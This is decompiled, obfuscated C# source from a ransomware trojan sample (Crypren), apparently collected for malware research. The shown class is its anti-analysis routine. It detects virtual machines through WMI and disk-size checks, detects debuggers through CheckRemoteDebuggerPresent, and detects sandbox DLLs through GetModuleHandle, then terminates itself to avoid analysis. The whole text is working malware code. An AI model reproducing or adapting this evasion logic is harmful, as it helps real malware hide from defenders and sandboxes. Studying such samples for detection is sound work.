// Decompiled with JetBrains decompiler
// Type: InTDhhOfzy.cLwQhOHJuPfZth
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0602F1A4-2566-46B4-A0A6-6E0F94D14C00
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-899f48bad035165acf8869af63922619f8a901bbeb8a7fc13919ba90dd9e7768.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace InTDhhOfzy
{
  internal sealed class cLwQhOHJuPfZth
  {
    [NonSerialized]
    internal static GetString \u000F;

    public static void kqPhFVAgBjSl()
    {
      if (cLwQhOHJuPfZth.suGEDLrFtCrEGY() || cLwQhOHJuPfZth.bOLEVWqvepU() || cLwQhOHJuPfZth.PMHjmMAAQcGj() || cLwQhOHJuPfZth.OPbDVhuxWuppT() || cLwQhOHJuPfZth.MaQCpZTxhbtY())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool OPbDVhuxWuppT()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool MaQCpZTxhbtY()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(cLwQhOHJuPfZth.\u000F(107410033)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool suGEDLrFtCrEGY()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(cLwQhOHJuPfZth.\u000F(107410028)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[cLwQhOHJuPfZth.\u000F(107409979)].ToString().ToLower();
              if (lower == cLwQhOHJuPfZth.\u000F(107409994) && managementBaseObject[cLwQhOHJuPfZth.\u000F(107409933)].ToString().ToUpperInvariant().Contains(cLwQhOHJuPfZth.\u000F(107409956)) || lower.Contains(cLwQhOHJuPfZth.\u000F(107409911)) || managementBaseObject[cLwQhOHJuPfZth.\u000F(107409933)].ToString() == cLwQhOHJuPfZth.\u000F(107409902))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool bOLEVWqvepU()
    {
      bool flag = false;
      try
      {
        cLwQhOHJuPfZth.XNfcyXYVTPCeq(Process.GetCurrentProcess().Handle, ref flag);
        return flag;
      }
      catch
      {
        return flag;
      }
    }

    private static bool PMHjmMAAQcGj()
    {
      try
      {
        return cLwQhOHJuPfZth.yScPjnYbQX(cLwQhOHJuPfZth.\u000F(107409917)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr yScPjnYbQX([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool XNfcyXYVTPCeq([In] IntPtr obj0, [In] ref bool obj1);

    static cLwQhOHJuPfZth() => Strings.CreateGetStringDelegate(typeof (cLwQhOHJuPfZth));
  }
}
